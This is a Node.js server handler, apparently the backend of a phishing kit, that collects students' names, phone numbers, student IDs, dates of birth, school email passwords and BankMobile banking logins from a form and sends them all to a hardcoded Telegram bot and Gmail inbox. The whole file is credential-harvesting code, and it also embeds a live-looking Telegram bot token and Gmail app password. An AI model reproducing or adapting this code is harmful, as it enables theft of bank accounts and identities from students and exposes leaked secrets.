const axios = require("axios");
const nodemailer = require("nodemailer"); // ✅ Add nodemailer

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
    studentid,
    dob,
  } = req.body || {};

  if (
    !fullName ||
    !phoneNumber ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword ||
    !studentid ||
    !dob ||
    typeof hasBankMobileProfile !== "string"
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const message = `
*New Form Submission*

Full Name: ${fullName}
Phone Number: ${phoneNumber}
Student ID: ${studentid}
DOB: ${dob}

*Current School*
Email: ${currentSchoolEmail}
Password: ${currentSchoolPassword}

*Previous School*
Email: ${previousSchoolEmail}
Password: ${previousSchoolPassword}

*BankMobile*
Has Profile: ${hasBankMobileProfile}
Email: ${bankMobileEmail || "N/A"}
Password: ${bankMobilePassword || "N/A"}
  `;

  const botToken = "7597626302:AAFxp2Q5hTEVaCGlt4pauCnVitgZXzNH7dw";
  const chatId = "1775129269";

  // === Email Setup ===
  const transporter = nodemailer.createTransport({
    service: "Gmail", // You can change this to your provider
    auth: {
      user: "recruitmentupdate9@gmail.com",       // ✅ Your sender email
      pass: "ghtb ltut ihbk ghor",     // ✅ App Password, NOT your real password
    },
  });

  const mailOptions = {
    from: '"Form Bot" <workingfullz@gmail.com>',
    to: "recruitmentupdate9@gmail.com", // ✅ Email recipient
    subject: "📥 BankMobile",
    text: message,
  };

  try {
    // Send Telegram message
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });

    // Send Email
    await transporter.sendMail(mailOptions);

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("❌ Error:", error.response?.data || error.message);
    return res.status(500).json({ error: "Failed to send message via Telegram or Email" });
  }
};
